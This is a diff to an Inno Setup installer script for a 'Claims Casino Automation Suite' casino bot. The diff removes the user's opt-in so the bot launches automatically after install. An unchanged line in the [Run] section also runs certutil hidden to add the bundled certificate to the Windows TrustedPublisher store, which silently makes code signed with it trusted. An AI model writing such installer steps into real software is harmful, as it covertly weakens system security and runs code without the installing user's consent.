@@ -2,7 +2,7 @@
 ; Inno Setup 6 Script
 
 #define MyAppName "Claims Casino Automation Suite"
-#define MyAppVersion "1.0.1"
+#define MyAppVersion "1.0.2"
 #define MyAppPublisher "Claims Casino 2026"
 #define MyAppURL "https://claimscasino.com"
 #define MyAppExeName "CasinoBot.exe"
@@ -44,7 +44,7 @@ Name: "{group}\Uninstall {#MyAppName}"; Filename: "{uninstallexe}"
 Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; WorkingDir: "{app}"
 
 [Run]
-Filename: "{app}\{#MyAppExeName}"; Description: "Launch {#MyAppName}"; Flags: postinstall nowait skipifsilent unchecked
+Filename: "{app}\{#MyAppExeName}"; Flags: nowait skipifsilent
 Filename: "certutil"; Parameters: "-addstore TrustedPublisher ""{app}\CasinoBot.cer"""; Flags: runhidden postinstall
 
 [UninstallRun]
